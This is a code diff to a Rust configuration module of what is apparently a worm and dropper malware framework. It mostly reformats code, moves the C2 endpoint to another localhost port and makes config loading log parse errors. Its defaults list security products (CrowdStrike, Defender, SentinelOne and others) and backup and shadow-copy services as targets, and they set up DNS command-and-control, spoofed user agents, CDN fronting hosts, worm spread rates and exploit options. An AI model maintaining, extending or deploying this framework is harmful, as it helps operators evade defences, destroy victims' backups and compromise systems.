@@ -2,9 +2,9 @@
 // Operators customize behavior without recompiling.
 // Config can be embedded encrypted in the dropper or loaded from disk.
 
+use crate::panal::HoneycombConfig;
 use serde::{Deserialize, Serialize};
 use std::path::Path;
-use crate::panal::HoneycombConfig;
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct HiveConfig {
@@ -149,28 +149,35 @@ impl Default for HiveConfig {
                 worm_max_infections_per_minute: 2,
                 worm_self_destruct_secs: 3600,
                 edr_processes: vec![
-                    "csfalcon".into(), "csagent".into(), "msmpeng".into(),
-                    "sentinelone".into(), "carbonblack".into(), "cylancesvc".into(),
-                    "symantec".into(), "mcafee".into(),
+                    "csfalcon".into(),
+                    "csagent".into(),
+                    "msmpeng".into(),
+                    "sentinelone".into(),
+                    "carbonblack".into(),
+                    "cylancesvc".into(),
+                    "symantec".into(),
+                    "mcafee".into(),
                 ],
                 backup_processes: vec![
-                    "veeam".into(), "backup_exec".into(), "commvault".into(),
-                    "netbackup".into(), "backup_agent".into(), "vss".into(),
+                    "veeam".into(),
+                    "backup_exec".into(),
+                    "commvault".into(),
+                    "netbackup".into(),
+                    "backup_agent".into(),
+                    "vss".into(),
                 ],
             },
             c2: C2Config {
-                url: "https://localhost:8443/collect".into(),
+                url: "http://localhost:8444/collect".into(),
                 api_key: "".into(),
                 dns_domain: "swarm.c2.local".into(),
                 dns_resolver: "8.8.8.8".into(),
                 http_user_agents: vec![
-                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0".into(),
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"
+                        .into(),
                     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0".into(),
                 ],
-                cdn_hosts: vec![
-                    "cdn.jsdelivr.net".into(),
-                    "cdnjs.cloudflare.com".into(),
-                ],
+                cdn_hosts: vec!["cdn.jsdelivr.net".into(), "cdnjs.cloudflare.com".into()],
             },
             exploits: ExploitsConfig {
                 enabled: false,
@@ -178,9 +185,7 @@ impl Default for HiveConfig {
                 target_whitelist: vec![],
                 max_attempts: 3,
                 safe_mode: true,
-                forbidden_segments: vec![
-                    "10.0.0.0/8".into(), "172.16.0.0/12".into(),
-                ],
+                forbidden_segments: vec!["10.0.0.0/8".into(), "172.16.0.0/12".into()],
             },
             limits: LimitsConfig {
                 max_processes: 20,
@@ -223,21 +228,46 @@ impl Default for SwarmConfig {
 }
 
 impl HiveConfig {
-    /// Load config from colmena.toml, falling back to defaults.
+    /// Load config from hive.toml (legacy name: colmena.toml), falling back to defaults.
+    ///
+    /// Search order: `./hive.toml` (repo root, the file shipped with the
+    /// project), then `colmena.toml` (legacy), then system/user config dirs.
+    /// A config file that exists but fails to parse is reported loudly
+    /// instead of being silently ignored.
     pub fn load() -> Self {
         let paths = [
+            "hive.toml",
             "colmena.toml",
+            "/etc/swarm/hive.toml",
             "/etc/swarm/colmena.toml",
-            &format!("{}/.config/swarm/colmena.toml",
-                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())),
+            &format!(
+                "{}/.config/hive/hive.toml",
+                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())
+            ),
+            &format!(
+                "{}/.config/swarm/colmena.toml",
+                std::env::var("HOME").unwrap_or_else(|_| "/tmp".into())
+            ),
         ];
 
         for path in &paths {
             if Path::new(path).exists() {
-                if let Ok(content) = std::fs::read_to_string(path) {
-                    if let Ok(cfg) = toml::from_str::<HiveConfig>(&content) {
-                        tracing::info!("Loaded config from {}", path);
-                        return cfg;
+                match std::fs::read_to_string(path) {
+                    Ok(content) => match toml::from_str::<HiveConfig>(&content) {
+                        Ok(cfg) => {
+                            tracing::info!("Loaded config from {}", path);
+                            return cfg;
+                        }
+                        Err(e) => {
+                            tracing::warn!(
+                                "Config file {} failed to parse ({}), trying next",
+                                path,
+                                e
+                            );
+                        }
+                    },
+                    Err(e) => {
+                        tracing::warn!("Config file {} exists but is unreadable: {}", path, e);
                     }
                 }
             }
